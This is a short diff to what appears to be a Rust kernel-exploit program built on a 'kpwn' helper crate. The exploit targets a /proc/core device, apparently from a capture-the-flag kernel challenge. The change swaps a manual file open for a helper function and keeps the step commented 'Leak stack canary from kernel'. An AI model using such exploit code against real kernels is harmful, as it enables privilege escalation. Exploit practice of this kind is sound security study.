@@ -1,5 +1,3 @@
-use std::fs::OpenOptions;
-
 use kpwn::all::*;
 
 #[repr(C)]
@@ -26,11 +24,7 @@ fn main() {
 
     whoami();
 
-    let dev = OpenOptions::new()
-        .read(true)
-        .write(true)
-        .open("/proc/core")
-        .unwrap();
+    let dev = open_dev("/proc/core").unwrap();
 
     // Leak stack canary from kernel
     let mut buf = [0u64; 8];
